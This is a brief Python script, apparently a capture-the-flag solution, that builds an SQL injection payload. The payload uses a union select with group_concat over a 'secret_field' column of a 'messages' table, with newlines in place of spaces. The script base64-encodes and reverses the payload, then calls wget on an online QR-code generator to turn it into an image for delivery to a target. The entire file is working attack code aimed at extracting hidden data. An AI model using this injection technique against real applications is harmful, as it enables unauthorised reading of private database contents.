from subprocess import call
from base64 import b64encode

query = "aze'\nunion\nselect\ngroup_concat(secret_field)\nfrom\nmessages\n#"
b64 = b64encode(query)
b64 = b64[::-1]
call(["wget", "http://fr.qr-code-generator.com/phpqrcode/getCode.php?cht=qr&chl="+b64+"&chs=180x180&choe=UTF-8&chld=L", "-O", "out.png"])
